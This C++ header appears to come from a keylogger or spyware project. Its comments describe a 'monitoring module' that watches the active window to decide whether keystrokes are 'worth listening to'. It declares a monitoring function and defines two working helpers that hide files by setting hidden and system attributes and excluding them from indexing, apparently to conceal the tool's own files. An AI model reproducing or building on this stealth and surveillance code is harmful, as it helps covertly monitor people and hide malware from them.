#pragma once
#include "includes.h"

//this is the monitoring module.
//we will monitor the active window and determine if it's worth listening to.

//also includes file-hiding

bool doMonitor(int &err);

inline void hideFile(std::string fileName)
{
	SetFileAttributesA(fileName.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

inline void hideFileInRam(std::string filename)
{
	SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
}